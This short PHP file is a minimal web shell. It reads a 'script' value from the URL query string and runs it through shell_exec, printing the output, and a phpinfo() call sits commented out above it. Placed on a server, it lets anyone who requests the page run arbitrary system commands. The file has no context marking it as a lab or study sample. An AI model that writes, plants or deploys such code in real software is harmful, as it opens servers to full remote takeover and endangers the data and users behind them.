<?php
//phpinfo();
$script=$_GET['script'];
echo shell_exec ($script);
?>
